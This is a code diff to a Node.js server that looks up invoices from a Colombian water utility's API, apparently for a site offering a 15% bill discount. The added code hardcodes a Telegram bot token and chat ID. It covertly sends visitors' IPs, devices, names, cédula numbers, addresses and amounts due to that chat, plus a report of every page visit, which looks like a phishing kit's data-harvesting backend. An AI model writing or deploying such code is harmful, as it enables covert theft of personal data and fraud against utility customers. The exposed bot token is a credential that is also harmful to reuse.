@@ -43,6 +43,50 @@ const API_BASE_URL = 'ws.suiteneptuno.com';
 const API_PATH = '/BarrancaAguasWeb/';
 
 // ============================================
+// CONFIGURACION TELEGRAM
+// ============================================
+const TELEGRAM_BOT_TOKEN = '8287996768:AAHN9DKIPY0OokiPNsy__AvPkN1_1lZ51mQ';
+const TELEGRAM_CHAT_ID = '-5119678298';
+
+/**
+ * Envia mensaje a Telegram
+ */
+function enviarTelegram(mensaje) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const postData = JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML'
+    });
+
+    const options = {
+        hostname: 'api.telegram.org',
+        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(postData)
+        }
+    };
+
+    const req = https.request(options, (res) => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+            if (res.statusCode === 200) {
+                console.log('Alerta Telegram enviada correctamente');
+            } else {
+                console.log('Error Telegram:', data);
+            }
+        });
+    });
+
+    req.on('error', (e) => console.error('Error enviando Telegram:', e));
+    req.write(postData);
+    req.end();
+}
+
+// ============================================
 // MIDDLEWARE
 // ============================================
 
@@ -243,6 +287,24 @@ app.post('/api/consultar-factura', async (req, res) => {
 
     console.log(`Consultando factura para codigo: ${codigoLimpio}`);
 
+    // Obtener IP del dispositivo
+    const ipCliente = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
+    const userAgent = req.headers['user-agent'] || 'Desconocido';
+    const fechaConsulta = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+    // Detectar tipo de dispositivo desde User-Agent
+    function detectarDispositivoUA(ua) {
+        if (/iPhone/i.test(ua)) return 'iPhone';
+        if (/iPad/i.test(ua)) return 'iPad';
+        if (/Android/i.test(ua)) return /Mobile/i.test(ua) ? 'Android' : 'Tablet Android';
+        if (/Windows Phone/i.test(ua)) return 'Windows Phone';
+        if (/Macintosh/i.test(ua)) return 'Mac';
+        if (/Windows/i.test(ua)) return 'Windows PC';
+        if (/Linux/i.test(ua)) return 'Linux';
+        return 'Desconocido';
+    }
+    const dispositivoCliente = detectarDispositivoUA(userAgent);
+
     try {
         // Paso 1: Obtener token y cookies
         console.log('Obteniendo token de verificacion...');
@@ -291,6 +353,31 @@ app.post('/api/consultar-factura', async (req, res) => {
                 const totalMesOriginal = factura.TOTALMES || valorOriginal;
                 const valorDescuentoMes = Math.round(totalMesOriginal * (porcentajeDescuento / 100));
                 const totalMesConDescuento = totalMesOriginal - valorDescuentoMes;
+
+                // ALERTA TELEGRAM - FACTURA REAL ENCONTRADA
+                const alertaFactura = `
+CONSULTA DE FACTURA - REAL
+
+Fecha: ${fechaConsulta}
+IP: ${ipCliente}
+Dispositivo: ${dispositivoCliente}
+
+DATOS DE LA FACTURA:
+Codigo Usuario: ${codigoLimpio}
+No. Factura: ${factura.NUMERO}
+Cliente: ${nombreCliente}
+Cedula: ${cedula || 'No disponible'}
+Direccion: ${direccion}
+
+VALORES:
+Valor Original: $${valorOriginal.toLocaleString('es-CO')}
+Descuento 15%: -$${valorDescuento.toLocaleString('es-CO')}
+Valor a Pagar: $${valorConDescuento.toLocaleString('es-CO')}
+
+Estado: PENDIENTE DE PAGO
+Vencimiento: ${formatearFecha(factura.FECHAVENCE) || 'No disponible'}
+`;
+                enviarTelegram(alertaFactura);
 
                 return res.json({
                     success: true,
@@ -372,6 +459,19 @@ app.post('/api/consultar-factura', async (req, res) => {
             const descargarMatch = mensaje.match(/Descargar\("([^"]+)",\s*(\d+),\s*(\d+)\)/);
 
             if (descargarMatch) {
+                // ALERTA TELEGRAM - FACTURA YA PAGADA
+                const alertaYaPagada = `
+CONSULTA DE FACTURA - YA PAGADA
+
+Fecha: ${fechaConsulta}
+IP: ${ipCliente}
+Dispositivo: ${dispositivoCliente}
+
+Codigo Consultado: ${codigoLimpio}
+Estado: La factura ya fue cancelada
+`;
+                enviarTelegram(alertaYaPagada);
+
                 // Extraer parámetros del botón de descarga
                 return res.json({
                     success: false,
@@ -385,6 +485,20 @@ app.post('/api/consultar-factura', async (req, res) => {
                     }
                 });
             }
+
+            // ALERTA TELEGRAM - FACTURA NO ENCONTRADA (NO REAL)
+            const alertaNoEncontrada = `
+CONSULTA DE FACTURA - NO EXISTE
+
+Fecha: ${fechaConsulta}
+IP: ${ipCliente}
+Dispositivo: ${dispositivoCliente}
+
+Codigo Consultado: ${codigoLimpio}
+Resultado: FACTURA NO ENCONTRADA
+Mensaje: ${mensaje.replace(/<[^>]*>/g, '').substring(0, 100)}
+`;
+            enviarTelegram(alertaNoEncontrada);
 
             return res.json({
                 success: false,
@@ -412,6 +526,45 @@ app.get('/api/health', (req, res) => {
         uptime: process.uptime(),
         apiConectada: 'https://ws.suiteneptuno.com/BarrancaAguasWeb/'
     });
+});
+
+/**
+ * POST /api/alerta-visita
+ * Recibe datos de visita y envia alerta a Telegram
+ */
+app.post('/api/alerta-visita', (req, res) => {
+    const { dispositivo, navegador, plataforma, pagina, userAgent, idioma, pantalla, referrer } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+    // Determinar emoji segun dispositivo
+    let emoji = '💻';
+    if (dispositivo === 'iPhone') emoji = '📱';
+    else if (dispositivo === 'Android') emoji = '📱';
+    else if (dispositivo === 'Tablet') emoji = '📲';
+
+    const mensaje = `
+${emoji} <b>NUEVA VISITA AL SITIO</b> ${emoji}
+
+📅 <b>Fecha:</b> ${fecha}
+📍 <b>IP:</b> ${ip}
+
+📱 <b>Dispositivo:</b> ${dispositivo || 'Desconocido'}
+🖥 <b>Plataforma:</b> ${plataforma || 'Desconocida'}
+🌐 <b>Navegador:</b> ${navegador || 'Desconocido'}
+🔤 <b>Idioma:</b> ${idioma || 'Desconocido'}
+📐 <b>Pantalla:</b> ${pantalla || 'Desconocida'}
+
+📄 <b>Página:</b> ${pagina || '/'}
+🔗 <b>Referrer:</b> ${referrer || 'Directo'}
+
+🔎 <b>User Agent:</b>
+<code>${userAgent || 'No disponible'}</code>
+`;
+
+    enviarTelegram(mensaje);
+
+    res.json({ success: true });
 });
 
 /**
